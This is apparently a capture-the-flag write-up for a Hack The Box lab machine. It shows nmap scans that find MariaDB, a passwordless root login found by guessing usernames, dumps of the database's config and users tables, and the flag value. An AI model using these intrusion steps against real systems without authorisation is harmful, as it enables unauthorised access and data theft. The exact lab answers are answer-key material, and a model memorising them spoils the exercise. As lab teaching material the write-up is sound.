<span style="color:cyan">**Question 1**</span> : During our scan, which port do we find serving MySQL?

I used nMap to identify open ports and services

```
cmd  nmap -sV -p- 10.129.68.218

Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-13 22:32 CET
Nmap scan report for 10.129.68.218 (10.129.68.218)
Host is up (0.030s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 164.49 seconds
```
From the output, it looks like the port serving MySQL is 3306.

    3306
    
<span style="color:cyan">**Question 2**</span>: What community-developed MySQL version is the target running?

I initially tried running the command nmap -sV IP address: 
```
cmd : nmap -sV IP address

Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-14 13:23 CET
Nmap scan report for 10.129.192.97
Host is up (0.11s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.86 seconds
```

However, I didn't get the MySQL version in the output. So, I used another command:

```
cmd : nmap -sC -sV -v IP address

3306/tcp open     mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 98
|   Capabilities flags: 63486
```

From this output, it seems the target is running the community-developed MySQL version known as MariaDB 

    MariaDB

<span style="color:cyan">**Question 3**</span>: When using the MySQL command line client, what switch do we need to use in order to specify a login username?

In the MySQL command line client, you can use the -u or --user switch to specify the login username.

    -u

<span style="color:cyan">**Question 4**</span>: Which username allows us to log into this MariaDB instance without providing a password?

I tried using admin, administrator, and root. It looks like using root allows logging into the instance without a password.
    root

<span style="color:cyan">**Question 5**</span>: In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?

In SQL, the asterisk (*) symbol is used as a wildcard character to represent all columns in a table. 

    *

<span style="color:cyan">**Question 6**</span>: In SQL, what symbol do we need to end each query with?

In SQL, we typically end each query with a semicolon `;`

    ;

<span style="color:cyan">**Question 7**</span>: There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?

Firstly i enter the istance by running the following command: 

```
cmd :  mariadb -u root -h 10.129.222.188

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 36
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

Using `show databases` I can see al the databases in the istance: 

```

cmd : show databases;

+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (1 min 37,118 sec)

```

I can see now the unique database:

    htb


<span style="color:cyan">**Question 8**</span>: Submit root flag

At this point i tried to enter htb running `use` command: 

```
cmd : use htb;
```

Then, since i wanna see all the tables...

```
cmd: show tables;

+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

Now i wanna see al the data, and i can have it by using the command `slect * from`: 

```
cmd: select * from config;

+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+


cmd : select * from users;

+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+



```

I can see the flag!

    7b4bec00d1a39e3dd4e021ec3d915da8 

